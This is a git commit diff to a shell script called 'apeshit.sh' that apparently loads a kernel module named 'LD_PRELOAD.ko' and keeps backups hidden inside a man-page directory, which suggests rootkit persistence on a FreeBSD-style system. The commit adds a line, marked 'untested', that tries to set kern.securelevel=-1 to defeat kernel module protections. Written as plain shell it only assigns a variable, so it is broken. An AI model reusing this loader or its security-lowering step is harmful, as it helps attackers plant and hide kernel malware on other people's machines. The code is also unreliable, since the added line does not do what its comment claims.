39006ec90ab8940cdc53f895f551b3050229583c
Baremetal MSI <spark61974@gmail.com>
2025-02-19 04:14:08 -0500

    .

--- apeshit.sh
+++ apeshit.sh
@@ -3,6 +3,12 @@
 # might need to sleep more depending on how many resources (how slow the box is) the box has
 sleep 10
 
+# prevent againt LKM security
+# untested line!!!
+# untested line!!!
+# untested line!!!
+kern.securelevel=-1
+
 LKM_NAME="LD_PRELOAD.ko"
 BACKUP_DIR="/usr/local/share/man/man1/backups"
 # Check if LD_PRELOAD.ko exists in /boot/modules
